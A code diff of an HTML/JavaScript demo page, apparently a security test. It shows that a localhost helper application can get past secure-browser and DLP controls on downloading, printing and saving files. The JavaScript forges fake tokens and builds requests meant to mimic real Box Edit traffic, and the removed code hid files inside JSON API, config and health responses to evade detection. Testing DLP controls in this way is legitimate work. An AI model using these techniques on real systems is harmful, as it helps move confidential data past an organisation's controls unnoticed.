@@ -15,13 +15,54 @@
             background: #0f0f0f;
             color: #e8e8e8;
             min-height: 100vh;
+            position: relative;
+        }
+        
+        .cat-background {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: -1;
+            pointer-events: none;
+            opacity: 0.47;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .cat-art {
+            font-family: 'Courier New', 'Lucida Console', 'Monaco', monospace;
+            font-size: 44px;
+            color: #fff;
+            line-height: 1.10;
+            margin: 0;
+            padding: 0;
+            text-align: left;
+            white-space: pre;
+            font-weight: normal;
+            letter-spacing: 0;
+            word-spacing: 0;
+            font-variant: normal;
+            text-rendering: optimizeSpeed;
+            -webkit-font-smoothing: none;
+            -moz-osx-font-smoothing: unset;
+            user-select: none;
+            text-shadow:
+                0 0 18px #fff,
+                0 0 6px #fff,
+                0 0 2px #fff;
         }
         
         .container {
-            background: #1a1a1a;
+            background: rgba(26, 26, 26, 0.85);
             border: 1px solid #333;
             border-radius: 8px;
             padding: 40px;
+            position: relative;
+            z-index: 1;
         }
         
         h1 {
@@ -33,7 +74,7 @@
         }
         
         .warning {
-            background: #2a2a2a;
+            background: rgba(42, 42, 42, 0.85);
             border: 1px solid #444;
             border-radius: 6px;
             padding: 20px;
@@ -43,7 +84,7 @@
         }
         
         .demo-section {
-            background: #1e1e1e;
+            background: rgba(30, 30, 30, 0.8);
             border: 1px solid #333;
             border-radius: 8px;
             padding: 25px;
@@ -101,18 +142,22 @@
         
         .server-status {
             position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 10px 16px;
-            font-size: 13px;
+            top: 15px;
+            right: 15px;
+            padding: 10px 15px;
+            font-size: 12px;
             border: 1px solid #444;
             border-radius: 20px;
             background: #2a1a1a;
             color: #f0b8b8;
+            z-index: 1000;
+            max-width: 140px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
         }
         
         .explanation {
-            background: #1a1a1a;
+            background: rgba(26, 26, 26, 0.8);
             border: 1px solid #2a2a2a;
             border-radius: 6px;
             padding: 18px;
@@ -154,6 +199,16 @@
     </style>
 </head>
 <body>
+    <div class="cat-background">
+        <pre class="cat-art">    |\---/|
+    | o,o |
+     \_`_/-..----.
+  ___/ `   ' ,""+ \
+ (__...'   **\    |`.**_.'
+   (_,...'(_,.`__)/'.....
+        </pre>
+    </div>
+    
     <div id="serverStatus" class="server-status">Server Offline</div>
     
     <div class="container">
@@ -178,42 +233,54 @@
 
         <div class="demo-section">
             <h3>FILE DOWNLOAD BYPASS <span class="badge">Critical</span></h3>
-            <p>Download sensitive files using various bypass techniques:</p>
-            <button onclick="bypassDownload()">Method 1: Box Edit Style</button>
-            <button onclick="bypassDownloadAPI()">Method 2: Fake API Call</button>
-            <button onclick="bypassDownloadConfig()">Method 3: Config Request</button>
-            <button onclick="bypassDownloadHealth()">Method 4: Health Check</button>
+            <p>Download sensitive files using Box Edit style bypass:</p>
+            <button onclick="bypassDownload()">Box Edit Style Download</button>
             <button onclick="attemptDirectDownload()">Internet Download (Should Fail)</button>
             <div id="downloadResult"></div>
             
             <div class="explanation">
-                <strong>Security Impact:</strong> Multiple bypass methods that disguise file downloads as legitimate API calls.
-                Methods 2-4 embed files in JSON responses to avoid detection.
+                <strong>Security Impact:</strong> Box Edit style communication bypasses secure browsers by mimicking 
+                legitimate application traffic. Downloads file and opens location (just like real Box Edit).
+                <br><br>
+                <strong>Test:</strong> The "Internet Download" button attempts to download a large Ubuntu ISO file directly 
+                through the browser - this should be blocked by DLP controls, while the Box Edit bypass succeeds.
             </div>
         </div>
 
         <div class="demo-section">
             <h3>PRINT BYPASS <span class="badge">High Risk</span></h3>
-            <p>Send content directly to the printer:</p>
-            <button onclick="bypassPrint()">Print Confidential Document</button>
-            <button onclick="attemptDirectPrint()">Attempt Direct Print (Should Fail)</button>
+            <p>Send content directly to the printer using Box Edit style:</p>
+            <button onclick="bypassPrint()">Box Edit Style Print</button>
+            <button onclick="attemptDirectPrint()">Browser Print (Should Fail)</button>
             <div id="printResult"></div>
             
             <div class="explanation">
                 <strong>Security Impact:</strong> Local applications can print documents even if the browser 
-                has printing disabled.
+                has printing disabled. Box Edit style method opens documents in Notepad for review/printing.
+                <br><br>
+                <strong>Test:</strong> The "Browser Print" button uses browser print API - this should be blocked 
+                by secure browsers, while the Box Edit style bypass succeeds.
             </div>
         </div>
 
         <div class="demo-section">
-            <h3>CUSTOM FILE SAVE <span class="badge">Demo</span></h3>
-            <p>Save custom content to the local filesystem:</p>
-            <textarea id="customContent" placeholder="Enter content to save locally..."></textarea>
+            <h3>CUSTOM FILE SAVE <span class="badge">High Risk</span></h3>
+            <p>Save custom content to the server directory:</p>
+            <textarea id="customContent" placeholder="Enter content to save to server directory..."></textarea>
             <div class="input-group">
                 <input type="text" id="customFilename" placeholder="filename.txt">
-                <button onclick="saveCustomFile()">Save to Local Machine</button>
+                <button onclick="saveCustomFile()">Save to Server Directory</button>
             </div>
             <div id="customResult"></div>
+            
+            <div class="explanation">
+                <strong>Security Impact:</strong> Files are saved directly to the server's running directory, 
+                making them easily accessible alongside the server files. Any content displayed in the browser 
+                can be extracted and saved locally through the helper application, regardless of browser security settings.
+                <br><br>
+                <strong>Test:</strong> This demonstrates how local applications can save arbitrary content to the 
+                filesystem, bypassing any browser-based file save restrictions through localhost communication.
+            </div>
         </div>
     </div>
 
@@ -246,20 +313,23 @@
             }
         }
 
+        // === BOX EDIT STYLE BYPASS FUNCTIONS ===
+        
         async function bypassDownload() {
             const resultDiv = document.getElementById('downloadResult');
             resultDiv.innerHTML = '<div class="status info">Initiating Box Edit style download...</div>';
             
             try {
-                // Step 1: Simulate getting token (we'll fake this)
+                // Step 1: Create fake credentials (simulating Box.com token generation)
                 const fakeToken = "bypass" + Math.random().toString(36).substr(2, 9);
                 const fakeAuthCode = "auth" + Math.random().toString(36).substr(2, 15);
                 const fileId = "1234567890123";
                 
-                // Step 2: Send Box Edit style command with query parameters
+                // Step 2: Send Box Edit style command with exact URL pattern that Box Edit uses
                 const timestamp = Date.now();
                 const commandUrl = `${LOCAL_SERVER}/application_command?application=BoxEdit&com=bypass-${timestamp}&timeout=4&ms=${timestamp}`;
                 
+                // Step 3: Create Box Edit style JSON payload (exactly matches real Box Edit structure)
                 const boxEditCommand = {
                     "command_type": "launch_application",
                     "file_id": fileId,
@@ -274,6 +344,7 @@
                     "shared_link": ""
                 };
                 
+                // Step 4: Send POST request that looks identical to real Box Edit traffic
                 const response = await fetch(commandUrl, {
                     method: 'POST',
                     headers: {
@@ -284,8 +355,9 @@
                 
                 const result = await response.json();
                 
+                // Step 5: Check if bypass was successful (like real Box Edit)
                 if (result.success === "true") {
-                    resultDiv.innerHTML = '<div class="status success">[SUCCESS] Box Edit style download completed! Check Downloads folder.</div>';
+                    resultDiv.innerHTML = '<div class="status success">[SUCCESS] Box Edit style download completed! Check Downloads folder and File Explorer.</div>';
                 } else {
                     resultDiv.innerHTML = '<div class="status error">[ERROR] Box Edit style command failed</div>';
                 }
@@ -295,105 +367,16 @@
             }
         }
 
-        async function bypassDownloadAPI() {
-            const resultDiv = document.getElementById('downloadResult');
-            resultDiv.innerHTML = '<div class="status info">Requesting document via API...</div>';
-            
-            try {
-                const response = await fetch(`${LOCAL_SERVER}/api/document`);
-                const data = await response.json();
-                
-                const binaryString = atob(data.content);
-                const bytes = new Uint8Array(binaryString.length);
-                for (let i = 0; i < binaryString.length; i++) {
-                    bytes[i] = binaryString.charCodeAt(i);
-                }
-                
-                const blob = new Blob([bytes], { type: 'application/zip' });
-                const url = URL.createObjectURL(blob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = data.filename;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                URL.revokeObjectURL(url);
-                
-                resultDiv.innerHTML = '<div class="status success">[SUCCESS] File extracted from API response!</div>';
-            } catch (error) {
-                resultDiv.innerHTML = `<div class="status error">[ERROR] API bypass failed: ${error.message}</div>`;
-            }
-        }
-
-        async function bypassDownloadConfig() {
-            const resultDiv = document.getElementById('downloadResult');
-            resultDiv.innerHTML = '<div class="status info">Fetching application config...</div>';
-            
-            try {
-                const response = await fetch(`${LOCAL_SERVER}/config.json`);
-                const config = await response.json();
-                
-                const binaryString = atob(config.backup_data);
-                const bytes = new Uint8Array(binaryString.length);
-                for (let i = 0; i < binaryString.length; i++) {
-                    bytes[i] = binaryString.charCodeAt(i);
-                }
-                
-                const blob = new Blob([bytes], { type: 'application/zip' });
-                const url = URL.createObjectURL(blob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = config.backup_filename;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                URL.revokeObjectURL(url);
-                
-                resultDiv.innerHTML = '<div class="status success">[SUCCESS] File extracted from config backup!</div>';
-            } catch (error) {
-                resultDiv.innerHTML = `<div class="status error">[ERROR] Config bypass failed: ${error.message}</div>`;
-            }
-        }
-
-        async function bypassDownloadHealth() {
-            const resultDiv = document.getElementById('downloadResult');
-            resultDiv.innerHTML = '<div class="status info">Checking system health...</div>';
-            
-            try {
-                const response = await fetch(`${LOCAL_SERVER}/health`);
-                const health = await response.json();
-                
-                const binaryString = atob(health.diagnostic_logs);
-                const bytes = new Uint8Array(binaryString.length);
-                for (let i = 0; i < binaryString.length; i++) {
-                    bytes[i] = binaryString.charCodeAt(i);
-                }
-                
-                const blob = new Blob([bytes], { type: 'application/zip' });
-                const url = URL.createObjectURL(blob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = health.log_filename;
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                URL.revokeObjectURL(url);
-                
-                resultDiv.innerHTML = '<div class="status success">[SUCCESS] File extracted from diagnostic logs!</div>';
-            } catch (error) {
-                resultDiv.innerHTML = `<div class="status error">[ERROR] Health bypass failed: ${error.message}</div>`;
-            }
-        }
-
         async function bypassPrint() {
             const resultDiv = document.getElementById('printResult');
             resultDiv.innerHTML = '<div class="status info">Sending to printer via Box Edit style...</div>';
             
             try {
-                // Use Box Edit style command for printing
+                // Step 1: Create Box Edit style print command with timestamp
                 const timestamp = Date.now();
                 const commandUrl = `${LOCAL_SERVER}/application_command?application=BoxEdit&com=print-${timestamp}&timeout=4&ms=${timestamp}`;
                 
+                // Step 2: Create confidential document content
                 const printCommand = {
                     "command_type": "print_document",
                     "content": `CONFIDENTIAL DOCUMENT - SECURITY BYPASS TEST
@@ -417,6 +400,7 @@ END OF DOCUMENT`,
                     "timestamp": timestamp
                 };
                 
+                // Step 3: Send Box Edit style print command
                 const response = await fetch(commandUrl, {
                     method: 'POST',
                     headers: {
@@ -427,8 +411,9 @@ END OF DOCUMENT`,
                 
                 const result = await response.json();
                 
+                // Step 4: Display result (Notepad should open)
                 if (result.success === "true") {
-                    resultDiv.innerHTML = '<div class="status success">[PRINT] Document sent via Box Edit style bypass!</div>';
+                    resultDiv.innerHTML = `<div class="status success">[PRINT] ${result.message || 'Document sent to Notepad successfully!'}</div>`;
                 } else {
                     resultDiv.innerHTML = '<div class="status error">[ERROR] Box Edit style print failed</div>';
                 }
@@ -437,6 +422,8 @@ END OF DOCUMENT`,
                 resultDiv.innerHTML = `<div class="status error">[ERROR] Print bypass failed: ${error.message}</div>`;
             }
         }
+
+        // === COMPARISON FUNCTIONS (SHOULD FAIL) ===
 
         async function saveCustomFile() {
             const content = document.getElementById('customContent').value;
